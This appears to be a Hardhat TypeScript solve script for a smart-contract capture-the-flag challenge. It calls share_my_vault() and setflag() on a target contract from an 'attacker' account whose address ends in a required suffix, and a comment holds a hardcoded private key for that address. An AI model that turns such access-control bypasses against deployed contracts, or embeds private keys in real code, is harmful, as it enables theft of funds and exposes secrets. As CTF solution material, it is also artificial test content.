import chalk from "chalk";
import { ethers } from "hardhat";
import { Existing__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

function help(){
    let data = ethers.toUtf8Bytes("ZT");
    log(`${ethers.hexlify(data)}`);
    // suffix: 0x5a54
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];
    // private key fbe28e86d49d3155523d059df9a44ef8390a8779757e41149b44aa7eb75cf33e
    // address 0xd41BC63873Be128dabaf5207847B7f3368455a54  suffix:0x5a54

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let existingContract;
    let tx;
    if(network.name == "hardhat") {
        existingContract = await new Existing__factory(deployer).deploy();
        await existingContract.waitForDeployment();
        existingContract = existingContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await existingContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        existingContract = Existing__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await existingContract.getAddress())}!`)
    }
    // help()

    if(existingContract) {
        tx = await existingContract.share_my_vault();
        await tx.wait();
        tx = await existingContract.setflag();
        await tx.wait();
        log(`Is solved: ${await existingContract.isSolved()}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});